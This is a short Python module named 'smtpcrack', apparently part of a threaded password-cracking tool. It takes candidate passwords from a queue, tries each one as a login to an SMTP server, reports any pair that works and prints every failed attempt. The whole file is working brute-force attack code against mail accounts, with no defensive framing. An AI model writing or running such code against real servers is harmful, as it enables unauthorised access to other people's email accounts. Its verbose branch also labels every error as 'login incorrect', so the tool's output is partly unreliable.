'''
module : smtplib
   smtpObj = smtplib.SMTP()
    smtpObj.connect(mail_host, 25)    # 25 为 SMTP 端口号
    smtpObj.login(mail_user,mail_pass)

'''


import time
import smtplib

class smtpcrack:
    def __init__(self,op,args):
        self.op=op
        self.args=args

    def run(self,inputq,outputq,username):
        while True:
            try:
                passwd=inputq.get(timeout=1)
            except:
                outputq.put(1)
                time.sleep(0.5)
                exit(1)


            try:
                smtpObj = smtplib.SMTP()
                smtpObj.connect(self.op.host, self.op.port)  # 25 为 SMTP 端口号
                smtpObj.login(username, passwd)
                outputq.put((username,passwd))
                time.sleep(0.5)
                exit(1)
            except Exception as e:
                if self.op.verbose!=None:
                    e='login incorrect'
                    print("%s ----- (Username:%s  Passwd:%s)" %(e,username,passwd))
                else:
                    print("Username:%s  Passwd:%s:" % (username, passwd))